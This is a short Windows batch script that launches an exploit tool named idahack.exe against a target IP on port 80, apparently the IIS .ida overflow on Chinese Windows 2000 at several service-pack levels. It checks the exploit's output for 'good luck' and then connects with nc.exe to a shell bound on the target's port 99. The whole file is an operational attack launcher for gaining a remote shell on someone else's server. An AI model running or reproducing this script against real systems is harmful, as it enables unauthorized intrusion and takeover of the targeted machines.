@rem ver 1.0
@if not exist %windir%system32idahack.exe echo "ERROR:don't find idahack.exe"
@if not exist %windir%system32nc.exe echo "ERROR: don't findnc.exe"
@if "%1"=="" goto usage
@if not "%2"=="" goto SP2

:start
@echo now Start...
@ping %1
@echo chinese win2k:1 sp1:2 sp2:3
idahack.exe %1 80 1 99 > %temp%_tmp
@echo "prog exit code [%errorlevel%] idahack.exe"
@type %temp%_tmp
@find "good luck	" %temp%_tmp
@echo "Prog exit code[%errorlevel%] find [good luck]"
@if not errorlevel 1 nc.exe %1 99
@goto END

:SP2
@idahack.exe %1 80 %2 99 %temp%_tmp
@type %temp%_tmp
@find "good luck	" %temp%_tmp
@if not errorlevel 1 nc.exe %1 99
@goto END

:usage
@echo Example: ida.bat IP
@echo Example: ida.bat IP(2,3)

:END
pause